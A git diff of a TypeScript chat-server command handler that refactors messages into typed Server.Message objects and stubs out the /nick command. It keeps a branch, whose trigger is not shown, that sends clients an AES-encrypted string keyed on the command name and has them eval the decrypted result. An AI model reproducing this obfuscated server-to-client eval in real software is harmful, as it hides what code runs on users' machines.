@@ -3,13 +3,13 @@ import bcrypt from "bcrypt";
 import {
   validateUsername,
   validateText,
-  passwordInHashArray,
   generateRandomHash,
   handleIsBanned,
 } from "../utils/helpers.js";
 import databaseService from "../services/databaseService.js";
 import Constants from "../utils/constants.js";
 import FullUser from "../models/User.js";
+import { Server } from "@interfaces/Message.js";
 
 interface Command {
   [key: string]: string;
@@ -47,7 +47,7 @@ async function handleCommand(user: FullUser, command: string): Promise<void> {
 
   switch (commandName) {
     case "nick":
-      handleNickCommand(user, commandParts);
+      handleNickCommand(user);
       break;
     case "login":
       handleLoginCommand(user, commandParts);
@@ -82,9 +82,9 @@ async function handleCommand(user: FullUser, command: string): Promise<void> {
       ) {
         user.connection.send(
           JSON.stringify({
-            Type: "eval",
-            Texte: `eval("let a = CryptoJS.AES.decrypt('U2FsdGVkX18kVsfpyvm4z65VO/AhGUhoOIE0rEpGBriRVqfBll8auGGM5lGRXzuUVN2a3sEh97vAyqn8CfMFAQ==','${commandName}').toString(CryptoJS.enc.Utf8); eval(a)")`,
-          })
+            type: Server.MessageType.EVAL,
+            content: `eval("let a = CryptoJS.AES.decrypt('U2FsdGVkX18kVsfpyvm4z65VO/AhGUhoOIE0rEpGBriRVqfBll8auGGM5lGRXzuUVN2a3sEh97vAyqn8CfMFAQ==','${commandName}').toString(CryptoJS.enc.Utf8); eval(a)")`,
+          } as Server.Message)
         );
       } else {
         handleUnknownCommand(user);
@@ -93,44 +93,20 @@ async function handleCommand(user: FullUser, command: string): Promise<void> {
   }
 }
 
-async function handleNickCommand(
-  user: FullUser,
-  commandParts: string[]
-): Promise<void> {
+async function handleNickCommand(user: FullUser): Promise<void> {
   user.connection.send(
     JSON.stringify({
-      Type: "commandError",
-      status: "error",
-      message: "Eh non pardi ! Les temps ont changé...",
-    })
+      type: Server.MessageType.MESSAGE,
+      content: {
+        type: Server.MessageType.ERROR,
+        content: {
+          text: "Eh non pardi ! Les temps ont changé...",
+          timestamp: Date.now().toString(),
+        },
+      },
+    } as Server.Message)
   );
   return;
-  if (commandParts.length === 2) {
-    const newUsername = commandParts[1];
-    if (validateUsername(newUsername)) {
-      user.name = newUsername;
-      user.connection.send(
-        JSON.stringify({ Type: "setUsername", Pseudo: newUsername })
-      );
-      publish("updateUsersList");
-    } else {
-      user.connection.send(
-        JSON.stringify({
-          Type: "commandError",
-          status: "error",
-          message: "Nom d'utilisateur invalide",
-        })
-      );
-    }
-  } else {
-    user.connection.send(
-      JSON.stringify({
-        Type: "commandError",
-        status: "error",
-        message: "Utilisation : /nick pseudo",
-      })
-    );
-  }
 }
 
 async function loginUserAndSendSession(
@@ -149,10 +125,15 @@ async function loginUserAndSendSession(
 
     user.connection.send(
       JSON.stringify({
-        Type: "commandSuccess",
-        status: "success",
-        message: `Rebonjour ${userInfo.Pseudo} !`,
-      })
+        type: Server.MessageType.MESSAGE,
+        content: {
+          type: Server.MessageType.SUCCESS,
+          content: {
+            text: `Rebonjour ${userInfo.Pseudo} !`,
+            timestamp: Date.now().toString(),
+          },
+        },
+      } as Server.Message)
     );
 
     user.name = userInfo.Pseudo;
@@ -197,9 +178,15 @@ async function handleLoginCommand(
   } else {
     user.connection.send(
       JSON.stringify({
-        Type: "commandError",
-        message: "Utilisation : /login pseudo mot_de_passe",
-      })
+        type: Server.MessageType.MESSAGE,
+        content: {
+          type: Server.MessageType.ERROR,
+          content: {
+            text: "Utilisation : /login pseudo mot_de_passe",
+            timestamp: Date.now().toString(),
+          },
+        },
+      } as Server.Message)
     );
   }
 }
